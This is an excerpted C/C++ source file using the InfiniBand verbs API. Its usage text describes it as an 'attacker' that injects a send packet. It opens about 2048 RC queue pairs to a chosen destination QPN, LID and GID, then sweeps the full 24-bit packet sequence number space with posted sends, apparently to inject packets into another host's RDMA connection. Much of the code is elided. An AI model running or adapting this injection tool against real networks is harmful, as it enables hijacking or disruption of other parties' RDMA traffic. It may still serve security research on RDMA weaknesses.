...
static int pp_connect_ctx(struct ibv_qp *qp, uint32_t port,  struct pingpong_dest *src,
...
static struct pingpong_context *pp_init_ctx(struct ibv_device *ib_dev, uint8_t port)
{
	...
	ctx->cq = ibv_create_cq(ctx->context, 10000, NULL,
					     NULL, 0);
...
void print_data(struct ibv_qp *qp){

  struct ibv_qp_attr attr;
  struct ibv_qp_init_attr init_attr;
  int ret = ibv_query_qp(qp, &attr, IBV_QP_STATE| IBV_QP_RQ_PSN | IBV_QP_SQ_PSN | IBV_QP_DEST_QPN, &init_attr );
  if(ret == 0){
   if(attr.qp_state != 3){
...
{
	printf("Usage:\n");
	printf("  %s            start an attacker and injectet a send packet\n", argv0);
	printf("\n");
	printf("Options:\n");
	printf("  -d, --ib-dev=<dev>     use IB device <dev> (default first device found)\n");
	printf("  -i, --ib-port=<port>   use port <port> of IB device (default 1)\n");
	printf("  -q, --qpn=<QPN> destination qpn \n");
	printf("  -n, --psn=<PSN> use PSN \n");
	printf("  -s, --slid=<LID> source LID. It is only for checks. \n");
	printf("  -t, --dlid=<LID> destination LID.  \n");
	printf("\nThe following options are used for Roce and global IB.\n");	
	printf("  -g, --sgid=<gid index> local port gid index. Used for Roce and global IB.\n");
	printf("  -x, --dgid1=<u64> destination gid part 1.\n");
	printf("  -z, --dgid2=<u64> destination gid part 2.\n");
}
...
int main(int argc, char *argv[])
{
	...
	while (1) {
		...
		c = getopt_long(argc, argv, "p:d:i:q:n:s:t:g:x:z:",
				long_options, NULL);
  ...
  rem_dest.lid = dlid;
	...
	uint32_t max_qp_wr = 128; 
	uint32_t messages = 1<<24;
	uint32_t total_qps = messages /max_qp_wr;// 2048;
	printf("We need to create %u QPs\n",total_qps);
	...
	for(uint32_t i =0; i<total_qps; i++){
	  struct ibv_qp_init_attr init_attr = {};
		...
		init_attr.cap.max_send_wr  = max_qp_wr;
		init_attr.cap.max_recv_wr  = 0;
		init_attr.cap.max_send_sge = 1;
		init_attr.cap.max_recv_sge = 1;
		init_attr.qp_type = IBV_QPT_RC;

		ibv_qp* qp = ibv_create_qp(ctx->pd, &init_attr);
		if (!qp)  {
			fprintf(stderr, "Couldn't create QP %u\n",i);
			total_qps = i;
			break;
		}
		qps.push_back(qp);
	...
	for(uint32_t i =0; i<total_qps; i++){
		rem_dest.psn = psn + i*128;
		if (pp_connect_ctx(qps[i], ib_port, &my_dest, mtu,  &rem_dest, sgid_idx))
	   		return 1;
	}
	...
	for(uint32_t i =0; i<total_qps; i++){
		for(uint32_t j =0; j<128; j++){
				...
				if(ibv_post_send(qps[i], &wr, &bad_wr)){
					printf("Failed to send %u %u\n",i,j);
					exit(1);
				}
			}
	}
	uint32_t counter = 128*total_qps;
	
	for(uint32_t k= 0; k < (messages-1)/total_qps/128 + 1; k++){
		for(uint32_t i =0; i<total_qps; i++){
			rem_dest.psn = psn + i*128+k*(128*total_qps);
			if (pp_connect_ctx(qps[i], ib_port, &my_dest, mtu,  &rem_dest, sgid_idx))
		   		return 1;
 	...
 	uint64_t ttime = std::chrono::duration_cast<std::chrono::microseconds>(end - start).count();

 	printf("sent in %lu us. ",ttime);
	printf("DOne\n");
